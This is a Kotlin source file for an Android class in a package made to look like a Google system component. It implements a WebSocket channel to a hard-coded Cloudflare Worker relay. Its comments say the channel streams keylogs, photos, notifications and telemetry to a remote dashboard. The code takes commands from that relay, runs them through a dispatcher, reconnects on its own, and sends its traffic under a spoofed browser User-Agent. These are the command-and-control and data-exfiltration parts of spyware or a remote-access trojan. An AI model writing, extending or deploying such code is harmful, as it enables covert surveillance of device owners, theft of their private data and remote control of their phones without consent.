package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject

/**
 * CloudflareWorkerWebSocketEngine
 *
 * Standalone Cloudflare Worker WebSocket Communication Engine ($0 cost, Zero KV storage).
 * Streams real-time commands, Base64 photos, keylogs, notifications, and telemetry payloads
 * directly in RAM memory between Web Dashboard and Android device.
 */
class CloudflareWorkerWebSocketEngine(
    private val context: Context,
    private val httpClient: OkHttpClient = OkHttpClient(),
    private val scope: CoroutineScope,
    private val commandDispatcher: (String, String) -> Unit
) {
    companion object {
        private const val TAG = "CloudflareWsEngine"
        const val DEFAULT_WORKER_URL = "https://websocket-worker-relay.johnduck99.workers.dev"
        @Volatile var activeInstance: CloudflareWorkerWebSocketEngine? = null

        fun sendWebSocketStreamEvent(eventTopic: String, eventData: JSONObject) {
            activeInstance?.sendEventPayload(eventTopic, eventData)
        }
    }

    private var webSocket: WebSocket? = null
    @Volatile private var isConnected = false
    @Volatile private var isRunning = false

    fun startEngine() {
        if (isRunning) return
        isRunning = true
        activeInstance = this
        Log.i(TAG, "Starting Standalone Cloudflare Worker WebSocket Engine ($DEFAULT_WORKER_URL)...")
        connectWebSocket()
    }

    fun stopEngine() {
        isRunning = false
        activeInstance = null
        try {
            webSocket?.close(1000, "Normal closure")
            webSocket = null
            isConnected = false
        } catch (_: Exception) {}
    }

    private fun connectWebSocket() {
        if (!isRunning) return
        scope.launch(Dispatchers.IO) {
            try {
                val devId = DeviceIdProvider.getDeviceId(context)
                val wsUrl = "$DEFAULT_WORKER_URL/ws?role=device&deviceId=$devId"
                    .replace("https://", "wss://")
                    .replace("http://", "ws://")

                val request = Request.Builder()
                    .url(wsUrl)
                    .addHeader("User-Agent", "Mozilla/5.0 (Android; Mobile)")
                    .build()

                webSocket = httpClient.newWebSocket(request, object : WebSocketListener() {
                    override fun onOpen(webSocket: WebSocket, response: Response) {
                        Log.i(TAG, "Cloudflare Worker WebSocket Relay Connected 🟢 ($wsUrl)")
                        isConnected = true
                    }

                    override fun onMessage(webSocket: WebSocket, text: String) {
                        try {
                            if (text.startsWith("{")) {
                                val json = JSONObject(text)
                                val method = json.optString("method", json.optString("command", json.optString("action", "")))
                                val reqId = json.optString("requestId", "ws_${System.currentTimeMillis()}")
                                if (method.isNotBlank()) {
                                    Log.i(TAG, "Received Cloudflare Worker WebSocket Command ($reqId): '$method'")
                                    commandDispatcher("ws_$reqId", method)
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "WebSocket message parse error: ${e.message}")
                        }
                    }

                    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                        isConnected = false
                        Log.w(TAG, "Cloudflare Worker WebSocket closed ($code: $reason). Reconnecting...")
                        scheduleReconnect()
                    }

                    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                        isConnected = false
                        Log.w(TAG, "Cloudflare Worker WebSocket failure (${t.message}). Reconnecting...")
                        scheduleReconnect()
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "connectWebSocket exception: ${e.message}")
                scheduleReconnect()
            }
        }
    }

    private fun scheduleReconnect() {
        if (!isRunning) return
        scope.launch(Dispatchers.IO) {
            delay(5000L)
            if (isRunning && !isConnected) {
                connectWebSocket()
            }
        }
    }

    fun sendEventPayload(topic: String, dataObj: JSONObject) {
        if (!isConnected || webSocket == null) return
        scope.launch(Dispatchers.IO) {
            try {
                val envelope = JSONObject().apply {
                    put("version", 1)
                    put("type", "EVENT")
                    put("event", topic)
                    put("data", dataObj)
                    put("timestamp", System.currentTimeMillis())
                }
                webSocket?.send(envelope.toString())
            } catch (e: Exception) {
                Log.e(TAG, "sendEventPayload error: ${e.message}")
            }
        }
    }
}
